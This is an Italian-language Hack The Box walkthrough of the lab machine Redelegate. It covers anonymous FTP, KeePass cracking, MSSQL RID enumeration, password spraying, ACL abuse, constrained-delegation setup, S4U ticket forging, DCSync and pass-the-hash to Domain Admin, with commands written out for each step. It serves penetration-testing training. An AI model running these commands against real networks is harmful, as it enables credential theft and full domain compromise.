---
title: 'HTB Redelegate Walkthrough: SeEnableDelegationPrivilege'
slug: htb-redelegate-walkthrough
description: 'WriteUp completo di Hack The Box Redelegate : FTP anonimo, KeePass, MSSQL, ForceChangePassword, SeEnableDelegationPrivilege, S4U, DCSync e Domain Admin.'
image: /redelegate-walktorugh-hack-the-box-htb.webp
draft: false
date: 2026-07-18T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - hack the box
  - delegation
  - seenabledelegationprivilege
---

# HTB Redelegate Walkthrough: da FTP anonimo a Domain Admin con Constrained Delegation

Redelegate è una macchina Windows di difficoltà "Hard" su Hack The Box (rilasciata e ritirata il 17 luglio 2025, creata da Geiseric), incentrata su enumerazione MSSQL, password spraying e abuso della delega Kerberos vincolata tramite [SeEnableDelegationPrivilege](https://hackita.it/articoli/seenabledelegationprivilege/). Se non hai ancora chiaro cosa significhi quel privilegio e come funzionano S4U2Self/S4U2Proxy, ti conviene leggere prima quell'articolo — qui diamo per scontato che tu sappia già la teoria e ci concentriamo sul percorso pratico sulla macchina.

## Ricognizione

Una scansione completa delle porte mostra un profilo tipico da Domain Controller Windows: DNS, Kerberos, LDAP, SMB, RPC, oltre a due servizi non standard — FTP sulla porta 21 e MSSQL sulla porta 1433. Il nome host è `DC`, il dominio `redelegate.vl`.

```bash
nmap -p- -vvv --min-rate 10000 10.129.234.50
```

Vale la pena generare subito la riga per `/etc/hosts` con netexec, così tutti i tool successivi risolvono correttamente il dominio:

```bash
netexec smb 10.129.234.50 --generate-hosts-file hosts
```

Il sito sulla porta 80 è la pagina IIS di default, senza contenuti utili nemmeno dopo un directory brute-force con feroxbuster. L'autenticazione SMB anonima/guest è disabilitata, quindi il punto di ingresso reale è altrove.

## FTP anonimo: il primo appiglio

Il server FTP accetta login anonimo e espone tre file: una nota di audit di sicurezza, un'agenda di formazione dei dipendenti, e un database KeePass condiviso (`Shared.kdbx`).

```bash
ftp anonymous@dc.redelegate.vl
```

L'agenda di formazione contiene un dettaglio tutt'altro che casuale: uno degli argomenti del corso è "perché 'SeasonYear!' non è una buona password" — un indizio chiaro sullo schema di password usato in azienda. Le date dell'agenda permettono di dedurre l'anno di riferimento (2024).

**Importante**: scarica il file `.kdbx` in modalità binaria FTP, altrimenti rischi di corrompere il database.

## Craccare il database KeePass

Si genera l'hash del database con `keepass2john` e si prova un piccolo dizionario mirato basato sullo schema "StagioneAnno!" (Winter2024!, Spring2024!, Summer2024!, Fall2024!, Autumn2024!) invece di affidarsi a rockyou — molto più efficiente quando hai già un pattern noto:

```bash
keepass2john Shared.kdbx | tee Shared.kdbx.hash
hashcat Shared.kdbx.hash seasons --user -m 13400
```

La password risultante sblocca il database, che contiene diverse credenziali salvate — tra cui un accesso MSSQL locale (`SQLGuest`) e altre voci non direttamente utili per l'accesso al dominio.

## Accesso MSSQL e i vicoli ciechi

Le credenziali `SQLGuest` funzionano solo con autenticazione locale al database (`--local-auth`), non come account di dominio Windows — quindi non aprono SMB o WinRM direttamente.

```bash
netexec mssql dc.redelegate.vl -u SQLGuest -p '<password>' --local-auth
mssqlclient.py SQLGuest:'<password>'@dc.redelegate.vl
```

Una volta dentro, i database visibili sono solo quelli di sistema — niente dati interessanti. `xp_cmdshell` è disabilitato e l'utente non ha permessi per riabilitarlo. Anche il tentativo classico di rubare l'hash NetNTLMv2 dell'account di servizio SQL via `xp_dirtree` verso una share SMB sotto il tuo controllo porta a un hash che non si riesce a crackare — un vicolo cieco noto di questa macchina, da non perderci troppo tempo.

## Enumerazione domain account via RID brute-force su MSSQL

La strada che paga è l'enumerazione degli account di dominio direttamente tramite MSSQL, sfruttando il fatto che ogni oggetto AD condivide lo stesso SID di base per dominio, cambiando solo il RID finale. In pratica: recuperi il SID base interrogando un gruppo noto (es. Domain Admins), poi provi in sequenza migliaia di RID plausibili chiedendo al server "chi è l'oggetto con questo SID?" — se la risposta non è nulla, hai trovato un account valido.

Scriverlo a mano funziona ma è lento e facile da sbagliare nella conversione degli interi in esadecimale little-endian. Conviene affidarsi direttamente al modulo Metasploit dedicato, che fa tutto il lavoro in automatico:

```
msf6 > use auxiliary/admin/mssql/mssql_enum_domain_accounts
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set RHOSTS dc.redelegate.vl
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set USERNAME hackita
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set PASSWORD Hackita123
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > run
```

Da questa enumerazione emerge l'elenco completo degli utenti di dominio, inclusi due account macchina (`DC$`, `FS01$`) e diversi utenti standard.

## Password spraying con lo schema stagionale

Con la lista di utenti in mano, si prova lo spray con lo stesso schema "StagioneAnno!" dedotto dall'agenda di formazione:

```bash
netexec smb dc.redelegate.vl -u users.txt -p seasons.txt --continue-on-success
```

Una delle credenziali funziona per un utente membro del gruppo Helpdesk. Da notare: un secondo account con privilegi elevati risponde con un errore diverso (account con restrizioni), segnale che la password lì è comunque sbagliata nonostante la risposta anomala — non confondere i due casi.

## Enumerazione BloodHound e il path di attacco

Con le credenziali dell'utente Helpdesk si raccolgono i dati con SharpHound o RustHound-CE (consigliato lanciare anche una seconda raccolta con un collector diverso, perché su questa macchina alcuni edge risultano a volte mancanti con un solo tool):

```bash
netexec ldap dc.redelegate.vl -u <utente> -p '<password>' --bloodhound --collection All --dns-server 10.129.234.50
```

Analizzando il grafo in [BloodHound](https://hackita.it/articoli/bloodhound/) emerge un classico caso di [ACL abuse](https://hackita.it/articoli/acl-abuse/): l'utente Helpdesk ha `ForceChangePassword` su un altro utente, che a sua volta ha `GenericAll` sull'oggetto computer `FS01$` — ed è anche membro di un gruppo con accesso Remote Management (WinRM).

## Prima shell

Si resetta la password del secondo utente sfruttando i permessi ereditati dal gruppo Helpdesk. Invece di netexec (già usato più volte finora) qui usiamo `net rpc`, un'alternativa via Samba che fa la stessa cosa passando dal protocollo RPC:

```bash
net rpc password "target-user" "Hackita123" -U "REDELEGATE.VL"/"hackita"%'Hackita123' -S "dc.redelegate.vl"
```

Sostituisci `target-user` con l'utente reale trovato tramite BloodHound, e `hackita`/`Hackita123` con le tue credenziali Helpdesk. Il risultato è identico a un reset via netexec — solo un tool diverso per lo stesso obiettivo, utile da conoscere quando netexec non è disponibile o dà problemi.

Poi si ottiene una shell WinRM diretta:

```bash
evil-winrm-py -i dc.redelegate.vl -u <target-user> -p 'NuovaPassword123!'
```

Da qui si recupera la user flag.

## Il privilegio chiave

Un controllo di `whoami /priv` rivela che l'utente ha sia `SeMachineAccountPrivilege` sia **[SeEnableDelegationPrivilege](https://hackita.it/articoli/seenabledelegationprivilege/)** — la combinazione che apre la strada alla privesc finale.

`MachineAccountQuota` risulta impostata a `0`, quindi la via della delega non vincolata "pulita" (creare un account macchina nuovo) è chiusa. Ma l'utente ha già `GenericAll` su `FS01$`, un account computer esistente — condizione perfetta per la delega vincolata.

## Sfruttamento: delega vincolata su FS01$

Si imposta il flag di protocol transition e l'SPN autorizzato sull'account FS01$:

```powershell
Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}
```

Si cambia la password dell'account FS01$ per averne il pieno controllo:

```bash
netexec smb dc.redelegate.vl -u <target-user> -p 'NuovaPassword123!' -M change-password -o USER='FS01$' NEWPASS='Password123!'
```

E si richiede il ticket di servizio [Kerberos](https://hackita.it/articoli/kerberos/) impersonando l'account macchina del Domain Controller (`dc`) — non `administrator`, che su questa macchina è protetto contro la delega, esattamente come spiegato nell'articolo di teoria:

```bash
getST.py 'redelegate.vl/FS01$:Password123!' -spn ldap/dc.redelegate.vl -impersonate dc
```

Con il ticket ottenuto si esegue il DCSync completo tramite `secretsdump`:

```bash
KRB5CCNAME=<file-ccache-ottenuto> secretsdump.py -k -no-pass dc.redelegate.vl
```

Da qui escono tutti gli hash NTLM e le chiavi Kerberos del dominio, incluso quello dell'Administrator.

## Root

Con l'hash NTLM dell'Administrator si ottiene una shell diretta usando `wmiexec`:

```bash
wmiexec.py redelegate.vl/administrator@dc.redelegate.vl -hashes :<hash-ntlm-administrator>
```

E si recupera la root flag dal desktop dell'Administrator.

## Riepilogo della catena

FTP anonimo → KeePass craccato con dizionario mirato → credenziali MSSQL locali → enumerazione domain account via RID brute-force su MSSQL → password spray con lo stesso schema → abuso ACL (ForceChangePassword → GenericAll) → shell WinRM → **SeEnableDelegationPrivilege** + `GenericAll` su un account computer esistente → delega vincolata su `ldap/` verso il DC, impersonando l'account macchina del DC invece di Administrator (protetto) → DCSync → Domain Admin.

Se la parte di delega vincolata non ti è chiara nel dettaglio — perché serve impersonare `dc` invece di `administrator`, cosa significano i flag di `userAccountControl`, o come depurare gli errori Kerberos più comuni — trovi tutto approfondito nell'[articolo dedicato a SeEnableDelegationPrivilege](https://hackita.it/articoli/seenabledelegationprivilege/).
